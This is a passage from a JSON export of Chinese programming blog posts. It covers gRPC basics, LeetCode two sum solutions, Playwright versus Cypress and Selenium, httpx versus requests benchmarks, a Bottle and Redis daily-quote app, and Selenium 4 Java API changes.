对于一些简单的操作和场景，且不介意使用jest作为测试框架的话，jesteer还是比较推荐的，可以极大的提升生产力；其他情况下就不推荐了。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/chrome%E4%B8%8A%E6%9B%B4%E5%A5%BD%E7%9A%84%E5%BD%95%E5%88%B6%E5%9B%9E%E6%94%BE%E5%B7%A5%E5%85%B7jesteer%E4%BB%8B%E7%BB%8D%E5%8F%8A%E8%AF%95%E7%94%A8/","title":"chrome上更好的录制回放工具？Jesteer介绍及试用"},{"content":"RPC 试想这样一种场景，一个复杂系统中的两个模块之前需要互相调用，一般的做法是什么？\n可能这两个模块是跑在同一个进程上，那么通信起来其实是非常方便的，也有可能这两个模块分别是跑在不同的进程之上，那么就涉及到复杂一点的跨进程通信的技术了。但这些都是模块部署在同一机器下的情景，大家想象起来也会比较容易。\n更加深入一些，如果两个模块跑在不同的机器之间，那么模块之前的调用如何实现呢？这就需要使用RPC技术了。\nRPC（Remote Procedure Call）— 远程过程调用，它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。RPC协议假定某些传输协议的存在，如TCP或UDP，为通信程序之间携带信息数据。在OSI网络通信模型中，RPC跨越了传输层和应用层。RPC使得开发包括网络分布式多程序在内的应用程序更加容易。\nRPC采用客户端/服务器模式。请求程序就是一个客户端，而服务提供程序就是一个服务器。首先，客户端调用进程发送一个有进程参数的调用信息到服务进程，然后等待应答信息。在服务器端，进程保持睡眠状态直到调用信息到达为止。当一个调用信息到达，服务器获得进程参数，计算结果，发送答复信息，然后等待下一个调用信息，最后，客户端调用进程接收答复信息，获得进程结果，然后调用执行继续进行。\n简单来说RPC需要server端和client端，server端定义一些函数，client端通过网络请求去调用这些函数拿到返回值。server端和client端跑在不同的机器上，结合微服务的概念就是server端就是一个独立的微服务，其他微服务需要通过启动client端来调用该微服务提供的服务。\ngRPC gRPC 一开始由 Google 开发，是一款语言中立、平台中立、开源的远程过程调用(RPC)系统。\n在 gRPC 里客户端应用可以像调用本地对象一样直接调用另一台不同的机器上服务端应用的方法，使得您能够更容易地创建分布式应用和服务。与许多 RPC 系统类似，gRPC 也是基于以下理念：定义一个服务，指定其能够被远程调用的方法（包含参数和返回类型）。在服务端实现这个接口，并运行一个 gRPC 服务器来处理客户端调用。在客户端拥有一个存根能够像服务端一样的方法。\n组成 典型的grpc实现有两端组成，分别是\nserver client gRPC的特性 由于client和server需要通过网络进行消息的传递，那么网络协议成了grpc里重要的一环。grpc协议是HTTP/2，这是一种优化过的http协议，实现了连接多路复用、双向流、服务器推送、请求优先级、首部压缩等机制。可以节省带宽、降低TCP链接次数、节省CPU，帮助移动设备延长电池寿命等。 服务端向外提供了一些可供调用的函数，这些函数的原型通过ProtoBuf协议来进行定义。ProtoBuf是由Google开发的一种数据序列化协议（类似于XML、JSON、hessian）。ProtoBuf能够将数据进行序列化，并广泛应用在数据存储、通信协议等方面。压缩和传输效率高，语法简单，表达力强。 支持多种编程语言。比如支持golang/java/c++/ruby/python/nodejs等。 gRPC的优点 使用protobuf进行消息的序列化，压缩率高，性能好，毕竟压缩的越小在网络上传播的速度就相对会更快一点 序列化反序列化直接对应程序中的数据类，不需要解析后在进行映射，其实除了可读性差之外，pb的使用方式跟json基本都差不多了 支持向前兼容和向后兼容，升级比较简单 支持多语言 典型的gRPC实现 典型的gRPC实现有3个部分，分别是\n服务定义，使用protobuf的语法 server端实现，可以使用任意支持的语言 client端实现，可以使用任意支持的语言 这里我们简单演示一下如何使用python实现简单的grpc server和client\n服务定义\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // The greeting service definition. service Greeter { // Sends a greeting rpc SayHello (HelloRequest) returns (HelloReply) {} // Sends another greeting rpc SayHelloAgain (HelloRequest) returns (HelloReply) {} } // The request message containing the user\u0026#39;s name. message HelloRequest { string name = 1; } // The response message containing the greetings message HelloReply { string message = 1; } server端实现\n1 2 3 4 5 6 7 8 class Greeter(helloworld_pb2_grpc.GreeterServicer): def SayHello(self, request, context): return helloworld_pb2.HelloReply(message=\u0026#39;Hello, %s!\u0026#39; % request.name) def SayHelloAgain(self, request, context): return helloworld_pb2.HelloReply(message=\u0026#39;Hello again, %s!\u0026#39; % request.name) ... client端实现\n1 2 3 4 5 6 7 def run(): channel = grpc.insecure_channel(\u0026#39;localhost:50051\u0026#39;) stub = helloworld_pb2_grpc.GreeterStub(channel) response = stub.SayHello(helloworld_pb2.HelloRequest(name=\u0026#39;you\u0026#39;)) print(\u0026#34;Greeter client received: \u0026#34; + response.message) response = stub.SayHelloAgain(helloworld_pb2.HelloRequest(name=\u0026#39;you\u0026#39;)) print(\u0026#34;Greeter client received: \u0026#34; + response.message) 测试gRPC的server 其实跟接口测试的概念差不多，使用client stub去调用server，然后进行断言就好了。简而言之就是写代码去调用server端提供的函数，然后做断言\n测试client 这一部分对大家来说可能不太好想象，有一种做法是mock client，实现client的一系列调用server的mock方法，然后把client代入正常的业务逻辑，最后做逻辑或流程正确与否的判断。\n举个例子，比如有个微服务使用client调用了a和b两个函数，那么就mock掉a和b的client端实现，最后在正常的业务逻辑结束之后，断言client先调用了a再调用了b。这种mock的方式之前在做单元测试的时候非常的普遍，一般是用来mock掉网络请求或者是数据库连接，用在rpc的client测试上就显得比较有意思了。\n性能测试 推荐使用ghz。\nghz · gRPC benchmarking and load testing tool\n监控 一般可以使用下面的两种方案\nOpenCensus Prometheus Tracing 因为微服务之前的调用链路很复杂，所以需要使用tracing来进行调用链的跟踪。这里可以简单的使用OpenCensus Jaeger exporter来实现。\ngrpc gateway 在测试和调式的时候，每次写client去调用server其实是一件比较麻烦的事情，grpc gateway提供了一种简单的方式把grpc转成restful形式的接口，这样就可以直接使用postman等工具进行调试和测试了。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/grpc%E7%AE%80%E4%BB%8B/","title":"grpc简介"},{"content":"应该还是有很多同学在刷题找工作吧，如果大家刷leetcode的话，推荐的做法是从简单到难，这样一来two sum是大家绕不过去的最著名的简单算法题了，废话不多说，先看题目的描述。\n给定一个整数数组 nums 和一个整数目标值 target，请你在该数组中找出 和为目标值 target 的那 两个 整数，并返回它们的数组下标。\n你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。\n你可以按任意顺序返回答案。\n示例 1：\n1 2 3 输入：nums = [2,7,11,15], target = 9 输出：[0,1] 解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。 示例 2：\n1 2 输入：nums = [3,2,4], target = 6 输出：[1,2] 示例 3：\n1 2 输入：nums = [3,3], target = 6 输出：[0,1] 提示：\n2 \u0026lt;= nums.length \u0026lt;= 104 109 \u0026lt;= nums[i] \u0026lt;= 109 109 \u0026lt;= target \u0026lt;= 109 只会存在一个有效答案 **进阶：**你可以想出一个时间复杂度小于 O(n2) 的算法吗？\n最无脑的解法 看到题目之后我随手写了一个版本，大概1分钟就写完了\n1 2 3 4 5 6 for i, outer in enumerate(nums): for j, inner in enumerate(nums): if(i != j): tmp = outer + inner if tmp == target: return [i, j] 运行之后发现没啥问题，那就提交吧。\n结果leetcode告诉我运行时间超出限制，可能是因为半夜脑子不行的关系，我百思不得其解，毕竟又不是不能用，能写出来就让我过得了。\nO(n*n)的正确解法 后来稍微研究了一下题目，发现其实可以改进一点。\n拿 [2,7,11,15]来说，其实代码运行的顺序可以是：\n先拿2，然后遍历剩下的[7, 11, 15]进行相加 再拿7，遍历后面的[11,15] 再拿11，遍历后面的[15] 也就是说每次遍历其实只要从后面剩下的部分开始，不需要再回到头部，毕竟正确结果只有1个，加过了的就不需要重复了。\n知道了思路，改起来就方便了。\n1 2 3 4 5 6 7 class Solution: def twoSum(self, nums: List[int], target: int) -\u0026gt; List[int]: for i, outer in enumerate(nums): for j in range(i + 1, len(nums)): tmp = nums[j] + outer if tmp == target: return [i, j] 提交之后发现没有问题，速度上击败了18%的用户，看来还有更低算法复杂度的解法。\n时间来到了半夜，还是睡觉先。\nO(n)的解法 时间来到了第2天。\n题目的重点应该是只有1个有效的答案，而且因为给出的数组是没有顺序的，所有不用往logn的算法复杂度去思考，应该有On的解法。\n应该可以用空间换时间。遍历数字把target-num[i]的值作为key存在dict里，value就是其index，后面如果遇到num[i]正好等与这个差值，那么返回i和对应的差值的index就好了。\n1 2 3 4 5 6 7 8 class Solution: def twoSum(self, nums: List[int], target: int) -\u0026gt; List[int]: hash_table = {} for i in range(len(nums)): if nums[i] in hash_table: return [i, hash_table[nums[i]]] else: hash_table[target-nums[i]] = i 这里之遍历了一次，而且dict里判断元素是否存在的算法复杂度是O(1)，因此整体来说复杂度还是O(n)\n总结 之所有去翻two sum这个题目是因为有次在某个群里看到有人说精通two sum的4种写法，很好奇，于是去写了一下，发现只写出了2种，自愧不如，不知道还有没有其他精妙的解决方案呢。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/leetcode%E6%9C%80%E6%9C%89%E5%90%8D%E7%9A%84%E7%AE%80%E5%8D%95%E7%AE%97%E6%B3%95%E9%A2%98two-sum/","title":"leetcode最有名的简单算法题：two sum"},{"content":"之前看到一篇文章比较系统的比较了playwright和cypress，这里简单翻译了一下，希望可以给大家在技术选型时提供一些参考。原文地址在这里：https://applitools.com/blog/cypress-vs-playwright/。文本中的演示代码可以在github仓库找到：https://github.com/applitools/webinar-cypress-vs-playwright\n第一轮：元素操作 首先从最常见的场景进行比较，看看最简单的流程。\n这是一个简单的登录场景，初相见感觉是差别不大，不过cypress显得更加简洁一些。在用户投票中，cypress以61%的得票胜出。\n第二轮：如何对iframe进行测试 尽管iframe的测试在日常的工作中并不是特别常见，不过iframe的处理对qa来说确实是一件非常有挑战的事情。实际上cypress需要引入插件才能进行处理，所以可能在这一轮playwright会稍微占据一些优势。playwright原生支持对iframe进行操作，省去了额外安装插件的工序。\n第三轮：等待与重试 因为现代web页面的特性，等待与重试成为了自动化测试工具非常重要的一种能力。参赛双方都有自动等待和重试的机制，直接看代码吧，在用户投票中这一轮cypress以53%的选票获胜。\n第四轮：处理浏览器的原生alert 鉴于每个工具的不同设计，看看它们各自如何处理本地浏览器事件是很有趣的事情。Playwright使用websocket服务器与浏览器进行通信，而Cypress则被注入到浏览器中，并从那里实现应用程序的自动化。处理本地浏览器的事件可能会更复杂，在这一轮比赛中也证明了这一点。虽然Playwright对警报和提示显示了一致的解决方案，不过Cypress对所有三种情况都有自己的解决方案，最后Playwright在本轮比赛中取得了91%的横扫胜利。\n第五轮：打开新窗口 在下一个例子中，我们试图将一个打开新窗口的页面实现自动化。每个工具的设计再次被证明是一个决定性因素。Playwright有一个API来处理一个新打开的标签，而Cypress则采用了一个hack的解决方案，从一个链接中移除目标属性，并完全防止打开一个新窗口。虽然我认为这实际上是一个足够好的解决方案，但观众中的测试同学们并不买账，并以80:20的票数支持Playwright。\n第六轮:处理API请求 能够处理API请求是一种自动化的超能力。你可以用它们来配置你的应用程序，创建测试数据，甚至是登录，甚至可以直接用这两种工具来进行纯的API测试! Cypress和Playwright都能很好地处理API请求。在Playwright中，你创建一个新的上下文，并从该上下文发射API请求。Cypress使用其现有的命令链语法来发送请求并测试返回值。三分之二的听众更喜欢Cypress的解决方案，并为其投票。\n第七轮：page object模式 尽管页面对象通常不被认为是Cypress的最佳选择，但它仍然是一种流行的模式。它们提供了必要的抽象性，并有助于使代码更加可读。这里的观众投票真的很接近。在现场活动中，实际上似乎是Playwright赢得了这一场，在节目结束后的交流中，我们发现这一轮应该以平局告终。\n第八轮：支持的语言 如今，测试人员使用的编程语言种类相当多。这就是为什么Playwright对语言的更广泛支持在这一轮中似乎是一个明显的赢家。然而，Cypress试图迎合开发人员的工作流程，对JavaScript和TypeScript的支持已经足够好。然而，对于来自不同语言背景、不习惯用这些语言编写代码的测试人员来说，这可能是一个痛点。似乎观众们同意更广泛的语言支持是更好的，并投票支持Playwright，投票率为77%。\n第九轮: 支持的浏览器 尽管Chrome是最流行的浏览器，并在大多数国家成为主导，但在测试web应用时，浏览器支持仍然很重要。两种工具都对各种浏览器有良好的支持，不过Cypress目前缺乏对Safari或WebKit的支持。这一轮playwright自然更胜一筹。\n第十轮：运行速度与性能 最后一轮的比拼是关于速度的。每个人都希望他们的测试能够快速运行，这样他们就能尽快得到关于他们应用程序状态的反馈。Playwright是这次的明显赢家，因为它的执行时间比Cypress快4倍。Cypress方面的一些最新改进肯定有帮助，但就速度而言，Playwright仍然是王者。\n所以最后的胜利者是？ 整个代码之争最终Playwright以70%的支持率获胜。活动结束后，我们举行了一个小型的余兴节目，更深入地讨论了这些例子并回答了一些问题。这是一个很好的方式，可以为例子提供更多的背景，并讨论一些没有说过的东西。\n我非常喜欢Twitter上有人说的一句话，他说真正的赢家是测试人员和QA工程师，他们可以在这些很棒的工具中挑选。我个人希望有更多的Cypress用户在活动后试用Playwright，反之亦然。\n这个活动绝对是有趣的，虽然比较代码片段和工具的不同能力很有趣，但我们很清楚，这些并不能说明问题的全部。测试人员的日常生活充满了调试、维护、复杂的测试设计决策、考虑风险和自动化的有效性\u0026hellip;\u0026hellip;仅仅看一小段代码并不能告诉我们这些工具在现实工作中的表现如何。\n所以你觉得谁应该是最后的赢家呢？\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/playwright-%E5%A4%A7%E6%88%98cypress/","title":"playwright 大战cypress"},{"content":"playwright是微软推出的一款e2e（端到端）测试工具，支持多种语言及浏览器，那么它会成为下一个selenium吗？前几天看到外国的一篇文章发表了其观点，这里翻译了一下并夹杂了一点点的私货，希望可以对大家所有帮助。\nselenium作为浏览器自动化项目来说是非常成功的存在。Selenium现在已经被下载了几百万次，并继续在全球范围内被广泛接受和使用。\nSelenium的成功的原因 Selenium是开源的，支持多种（如Java、C#、Js、Python、Ruby、Perl等），支持所有的浏览器（chrome、firefox、edge、ie、safari、opera等），可以在多种操作系统（Windows、MAC、Linux）上运行。 Selenium功能强大\u0026ndash;它可以做web测试，也能做跨浏览器兼容性测试。另外selenium设计的初衷是浏览器的自动化，所以除了用作测试之外，selenium还在web自动化操作领域有所建树。 Selenium有一个庞大的用户社区，可以帮助你快速入门。 与其他开源工具相比，Selenium非常稳定，它的实现甚至成了标准的w3c协议。 最后，Selenium社区是充满活力的，定期举行许多活动和研讨会，你可以与志同道合的人讨论最新的工具和技术。 playwright会成为下一个selenium吗？ 考虑到现代Web应用自动化，Selenium WebDriver似乎是最受欢迎的工具之一，然而，像Playwright、Puppeteer、Cypress这样的替代工具正在出现，并争取在一段长时间之后能对其进行超越。\nPlaywright是一个JavaScript框架，支持在前端实现Web应用程序的自动化。它在后端使用Node.js，就像Puppeteer那样。它扩展了该框架，为用户提供了编写端到端测试或隔离测试应用程序特定部分所需的所有工具。\n支持使用包括Java、Js、C#、Python在内的语言编写测试用例，并像Selenium WebDriver一样在任何浏览器和任何操作系统上运行。它是开源的，很容易使用，支持单兵作战和团队协同。\n在UI自动化领域，Playwright能够成为下一个Selenium的主要原因有以下七个方面。\nPlaywright得到了微软的支持，其作者来自Puppeteer（谷歌）团队，因此playwright可以吸收Puppeteer积极的方面。另外，它已经了一些版本来支持多种编程语言，社区的反馈也非常积极。简而言之微软的钞能力和干爹属性使其相对其他开源项目来说可能会有更多的持续性。\nPlaywright的架构更简化，它摆脱了selenium复杂的设置和维护本地driver的繁琐过程，基本上开箱即用，工程化方面的实践也更加深入。初学selenium的同学应该记得selenium安装之后没有下载driver的话就是不能用的，特定版本的浏览器需要特定版本的driver配合，对于一些长期项目的维护来说确实有时候会带来额外的工作量。\nPlaywright的测试执行速度非常高（平均比selenium快40%），因为它使用JavaScript引擎如Node.js来运行测试，而不是Selenium的driver程序。因此，与Selenium WebDriver相比，使用Playright可以大大降低测试执行时间。\n与Selenium WebDriver不同，Playwright除了支持测试页面的全屏截图外，还支持边测试边录屏，感觉现代化了不少。\n与Selenium WebDriver相比，Playright的维护成本更低，因为它使用内部等待，而不像Selenium WebDriver需要管理显式等待。这大大降低了总的代码编写和维护成本。\nPlaywright除了支持web自动化测试外，还支持RESTFul API测试。这使测试人员可以灵活地使用Playwright测试他们的后端服务。\n最后，Playwright可以跟浏览器的开发者工具进行集成，这使得用Playwright编写开发测试非常容易和简单。\n原文地址：https://medium.com/testleaftechblog/will-playwright-become-next-selenium-b41eebfa5d25\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/playwright%E4%BC%9A%E6%88%90%E4%B8%BA%E4%B8%8B%E4%B8%80%E4%B8%AAselenium%E5%90%97/","title":"playwright会成为下一个selenium吗？"},{"content":"python的requests库由于其使用简单，文档丰富成为了很多人在发送http请求时候的优选选择。前几天看到了一个类似的实现httpx，在这里简单使用体验一下，顺便简单分享一下体验心得。\n相比较requests，httpx支持sync和async的API，支持http1.1和http2。httpx尽最大努力兼容requests的API，这样一来用户从requests转换到httpx的成本就相对较为低廉了。\n基本API 1 2 3 4 5 6 7 8 9 10 \u0026gt;\u0026gt;\u0026gt; import httpx \u0026gt;\u0026gt;\u0026gt; r = httpx.get(\u0026#39;https://www.example.org/\u0026#39;) \u0026gt;\u0026gt;\u0026gt; r \u0026lt;Response [200 OK]\u0026gt; \u0026gt;\u0026gt;\u0026gt; r.status_code 200 \u0026gt;\u0026gt;\u0026gt; r.headers[\u0026#39;content-type\u0026#39;] \u0026#39;text/html; charset=UTF-8\u0026#39; \u0026gt;\u0026gt;\u0026gt; r.text \u0026#39;\u0026lt;!doctype html\u0026gt;\\n\u0026lt;html\u0026gt;\\n\u0026lt;head\u0026gt;\\n\u0026lt;title\u0026gt;Example Domain\u0026lt;/title\u0026gt;...\u0026#39; 简单扫一圈，满眼都是requests当年的样子。下面是requests的API，大家来找茬，看看哪里不一样。\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026gt;\u0026gt;\u0026gt; import requests \u0026gt;\u0026gt;\u0026gt; r = requests.get(\u0026#39;https://api.github.com/user\u0026#39;, auth=(\u0026#39;user\u0026#39;, \u0026#39;pass\u0026#39;)) \u0026gt;\u0026gt; r.status_code 200 \u0026gt;\u0026gt; r.headers[\u0026#39;content-type\u0026#39;] \u0026#39;application/json; charset=utf8\u0026#39; \u0026gt;\u0026gt; r.encoding \u0026#39;utf-8\u0026#39; \u0026gt;\u0026gt; r.text \u0026#39;{\u0026#34;type\u0026#34;:\u0026#34;User\u0026#34;...\u0026#39; \u0026gt;\u0026gt; r.json() {\u0026#39;private_gists\u0026#39;: 419, \u0026#39;total_private_repos\u0026#39;: 77, ...} 不能说非常相似，只能说是一模一样。\nhttpx client requests为一组http请求提供了session对象来进行统一设置和管理，httpx则相应的提供了client对象。我们来对比一下使用方式先。\n首先使用starlette来创建一个简单的python api服务。starlette项目可以想象成是async版本的flask，跟httpx系出同门。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # example.py from starlette.applications import Starlette from starlette.responses import JSONResponse from starlette.routing import Route async def homepage(request): await asyncio.sleep(0.1) # 加一点点等待，不加也可以 return JSONResponse({\u0026#39;hello\u0026#39;: \u0026#39;world\u0026#39;}) routes = [ Route(\u0026#34;/\u0026#34;, endpoint=homepage) ] # app = Starlette(debug=True, routes=routes) app = Starlette(debug=False, routes=routes) 使用uvicorn运行。\n1 $ uvicorn example:app 上面的服务提供了1个接口localhost:8000，返回值如下\n1 2 3 4 5 6 7 8 9 10 11 http :8000 HTTP/1.1 200 OK content-length: 17 content-type: application/json date: Thu, 11 Aug 2022 07:10:07 GMT server: uvicorn { \u0026#34;hello\u0026#34;: \u0026#34;world\u0026#34; } 我们先用非client/session方式来访问该接口30次，顺便统计一下运行时间\nrequests先出场。\n1 2 3 4 5 6 # without_session import requests for i in range(0,30): res = requests.get(\u0026#39;http://localhost:8000/\u0026#39;).json() print(res) 1 python without_session.py 0.24s user 0.08s system 9% cpu 3.500 total 上面是不用session的方式，3.5s完成。\n使用session试试。\n1 2 3 4 5 6 7 import requests s = requests.Session() for i in range(0,30): res = s.get(\u0026#39;http://localhost:8000/\u0026#39;).json() print(res) 1 python with_session.py 0.22s user 0.08s system 8% cpu 3.443 total 3.44s，快了一点点。\n下面是httpx不使用client的方式。\n1 python without_client.py 0.69s user 0.11s system 20% cpu 3.972 total 3.9s。\n使用client试试\n1 2 3 4 5 6 import httpx with httpx.Client() as client: for i in range(0, 30): res = client.get(\u0026#39;http://localhost:8000/\u0026#39;).json() print(res) 1 python with_client.py 0.38s user 0.11s system 13% cpu 3.707 total 3.7s，也快了一些。\n这里可以简单总结一下，使用client/session可以提升一组请求的发送效率，另外也提供了进行统一配置（比如修改header的）的快捷方式。上面的测试由于请求处理的太快效果不是很明显，在日常的测试中两种方式的区别可能会更加容易发现一些。\nasync 还是30个请求，这次我们用httpx的async方式来试试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 import asyncio from asyncio import tasks import httpx async def send_requests(client): r = await client.get(\u0026#39;http://localhost:8000\u0026#39;) print(r.json()) return r.json() async def main(): tasks = []\tasync with httpx.AsyncClient() as client: for i in range(0, 30): tasks.append(send_requests(client)) await asyncio.gather(*tasks) asyncio.run(main()) 1 python httpx_async.py 0.47s user 0.13s system 71% cpu 0.848 total 0.84秒，这大概就是httpx的最终奥义吧。\n总结 作为下一代的http client，httpx出自名门望族(其开发团队开发了**django-rest-framework**)，兼容了部分的requests api，支持async操作等，是具有取代requests的能力的，在爬虫场景非常有潜力。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/python-requests%E7%9A%84%E6%9B%BF%E4%BB%A3%E8%80%85httpx%E5%88%9D%E4%BD%93%E9%AA%8C/","title":"python requests的替代者？httpx初体验"},{"content":"功能 拉取金山词霸每日一句的内容存到redis里，用bottle实现简单的路由去回显内容\n安装 1 2 3 4 pip install bottle Installing collected packages: bottle Successfully installed bottle-0.12.21 获取内容 api接口的响应如下，通过日期就可以拿到每日一句的具体内容了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 { errno: 0, errmsg: \u0026#34;success\u0026#34;, sid: 4543, title: \u0026#34;2022-07-04\u0026#34;, content: \u0026#34;The darker the sky, the brighter the stars. \u0026#34;, note: \u0026#34;天空越黑，星星越亮。\u0026#34;, translation: \u0026#34;新版每日一句\u0026#34;, picture: \u0026#34;https://staticedu-wps.cache.iciba.com/image/cae3e193caf289efe5d33bf63a37ad4b.jpg\u0026#34;, picture2: \u0026#34;https://staticedu-wps.cache.iciba.com/image/6286d34c787320416bc8d7083e6f6553.jpg\u0026#34;, picture3: \u0026#34;https://staticedu-wps.cache.iciba.com/image/8d56d2093875904a2483203784d600b6.jpg\u0026#34;, caption: \u0026#34;词霸每日一句\u0026#34;, tts: \u0026#34;https://staticedu-wps.cache.iciba.com/audio/ba16eadbfc36a3640409665c50ae996c.mp3\u0026#34;, tts_size: \u0026#34;\u0026#34;, s_pv: 5564, sp_pv: 0, love: 7, s_content: \u0026#34;\u0026#34;, s_link: \u0026#34;\u0026#34;, period: 0, loveFlag: 0, tags: \u0026#34;\u0026#34;, keep: 0, comment_count: 640, last_title: \u0026#34;2022-07-03\u0026#34;, next_title: 0, } 具体代码如下\n1 2 3 4 5 6 URL = \u0026#39;https://sentence.iciba.com/index.php?c=dailysentence\u0026amp;m=getdetail\u0026amp;title=2022-07-04\u0026#39; def set_quotes(): r = redis.Redis(host=\u0026#39;localhost\u0026#39;, port=6379, db=0) obj = requests.get(URL).json() r.set(obj[\u0026#39;title\u0026#39;], obj[\u0026#39;content\u0026#39;]) 第一个路由 创建文件get_quote_v1.py文件，内容如下\n1 2 3 4 5 6 7 8 9 import redis from bottle import route, run, debug, template @route(\u0026#39;/quote\u0026#39;) def get_quote(): key = \u0026#39;2022-07-04\u0026#39; r = redis.Redis(host=\u0026#39;localhost\u0026#39;, port=6379, db=0) content = r.get(key) return template(\u0026#39;quote_v1\u0026#39;, quote=content) 这里通过redis拿到了7月4日的每日一句内容，然后渲染了quote_v1这个模板\n第一个模板 在当前文件夹下创建quote_v1.tpl文件，内容如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.tailwindcss.com\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;w-1/2 mx-auto\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;text-2xl font-bold my-64 text-center\u0026#34;\u0026gt; {{quote}} \u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 最终效果 世界应该更丰富多彩一些 我们可以看到接口里返回了中文，英文以及配图信息，那3个picture字段就是。能不能实现个每日一句的卡片，主背景是配图，文字浮在图片上？\n答案是肯定的。具体实现方式是我们可以把响应内容直接存在redis的string里，key就是每天的日期，value是响应返回的json字符串。取数据的时候只要把json字符串拿到然后转成python的字典就好了。\n具体实现 1 2 3 4 5 6 7 8 9 10 @route(\u0026#39;/quote_v2\u0026#39;) def get_quote(): key = \u0026#39;2022-07-04\u0026#39; r = redis.Redis(host=\u0026#39;localhost\u0026#39;, port=6379, db=0) json_str = r.get(key) quote_obj = json.loads(json_str) return template(\u0026#39;quote_v2\u0026#39;, en=quote_obj[\u0026#39;content\u0026#39;], cn=quote_obj[\u0026#39;note\u0026#39;], img=quote_obj[\u0026#39;picture2\u0026#39;]) debug(True) run(reloader=True) 路由处理的代码跟之前差不多，只是把http响应里的json字段缓存了一下。\n模板代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;!doctype html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.tailwindcss.com\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;bg-gray-50\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container mx-auto my-20\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;max-w-sm bg-white rounded-lg border border-gray-200 shadow-md dark:bg-gray-800 dark:border-gray-700 mx-auto\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;rounded-t-lg\u0026#34; src=\u0026#34;{{img}}\u0026#34; alt=\u0026#34;\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;div class=\u0026#34;p-5\u0026#34;\u0026gt; \u0026lt;a href=\u0026#34;#\u0026#34;\u0026gt; \u0026lt;h5 class=\u0026#34;mb-2 text-2xl font-bold tracking-tight text-gray-900 dark:text-white\u0026#34;\u0026gt;{{en}}\u0026lt;/h5\u0026gt; \u0026lt;/a\u0026gt; \u0026lt;p class=\u0026#34;mb-3 font-normal text-gray-700 dark:text-gray-400\u0026#34;\u0026gt;{{cn}}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 改变了一下样式，显示了更多的内容。\n最终效果 总结 bottle体验下来感觉跟flask差不多，有时间的同学可以拿来玩玩。\n优点\n使用简单 配置简单 文档详细 模板简单 缺点\n模板tpl格式的编辑器支持不好，目前找不到好的高亮显示方式 支持wsgi，然而找不到一个完整的例子，只能自己捣鼓 ","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/python-web%E6%A1%86%E6%9E%B6bottle-%E5%88%9D%E4%BD%93%E9%AA%8C/","title":"python web框架bottle 初体验"},{"content":"众所周知，java语言版本的selenium一般被认为是最正宗的selenium版本，今天我们以java语言为例，来看看selenium 4.0的各种新特性以及新旧api的对比。\nCapabilities 如果你需要对浏览器进行一些全局设置，那么使用Capabilities是唯一的选择。说实话，旧的Capabilities有点不太符合直觉，具体用法如下。\n1 2 3 4 DesiredCapabilities capabilities = DesiredCapabilities.chrome(); capabilities.setCapability(\u0026#34;platform\u0026#34;, \u0026#34;Mac OS X\u0026#34;); capabilities.setCapability(\u0026#34;version\u0026#34;, \u0026#34;94\u0026#34;); driver = new RemoteWebDriver(capabilities); 在新版本中，我们直接设置options就可以了，语义上显得更为自然。\n1 2 3 4 ChromeOptions options = new ChromeOptions(); options.setBrowserVersion(\u0026#34;94\u0026#34;); options.setPlatformName(\u0026#34;Mac OS X\u0026#34;); driver = new ChromeDriver(options); Waits 在之前的版本里，我们实例化各种wait对象时候需要传入2个参数：time以及type of time，在新版本里我们只需要使用Duration类就可以了。\n这是之前的做法\n1 2 3 driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS); driver.manage().timeouts().pageLoadTimeout(10, TimeUnit.SECONDS); driver.manage().timeouts().setScriptTimeout(10, TimeUnit.SECONDS); 新的方式\n1 2 3 driver.manage().timeouts().implicitlyWait(Duration.ofSeconds(10)); driver.manage().timeouts().pageLoadTimeout(Duration.ofMinutes(3)); driver.manage().timeouts().setScriptTimeout(Duration.ofHours(1)); 当然，现在支持各式各样的Duration了，需要注意的是这里接受的是long型的参数。\n1 2 3 4 5 6 Duration.ofNanos(long nanos); 